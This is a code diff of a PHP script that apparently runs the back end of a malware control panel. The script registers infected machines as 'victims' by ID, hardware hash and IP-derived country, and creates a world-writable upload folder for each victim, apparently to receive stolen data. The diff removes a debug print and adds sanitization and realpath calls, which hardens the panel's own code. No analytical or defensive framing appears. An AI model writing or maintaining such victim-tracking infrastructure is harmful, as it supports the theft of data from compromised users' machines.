@@ -12,7 +12,6 @@ $country = getConteryCode($ipaddress);
 $date = date("Y-m-d");
 $data = isset($_GET['data']) ? explode("|BN|", $utils->sanitize($utils->base64_decode_url($_GET['data']))) : '';
 
-print_r($data);
 $clientdata = [
     'vicid' => $data[0],
     'hwid' => strtoupper(sha1($data[1])),
@@ -31,7 +30,8 @@ $clientdata = [
 ];
 
 $client->newClient($clientdata);
-@new_dir(trim($data[0], "./"));
+
+@new_dir($utils->sanitize($data[0]));
 
 function getConteryCode($ipaddress)
 {
@@ -48,10 +48,10 @@ function getConteryCode($ipaddress)
 function new_dir($victimID)
 {
     try {
-        @mkdir("upload/$victimID");
-        @copy(realpath("upload/index.php"), "upload/$victimID/index.php");
-        @copy(realpath("upload/.htaccess"), "upload/$victimID/.htaccess");
-        @chmod("upload/$victimID", 0777);
+        @mkdir(realpath("upload/$victimID"));
+        @copy(realpath("upload/index.php"), realpath("upload/$victimID/index.php"));
+        @copy(realpath("upload/.htaccess"), realpath("upload/$victimID/.htaccess"));
+        @chmod(realpath("upload/$victimID"), 0777);
     } catch (Exception $e) {
         return $e->getMessage();
     }
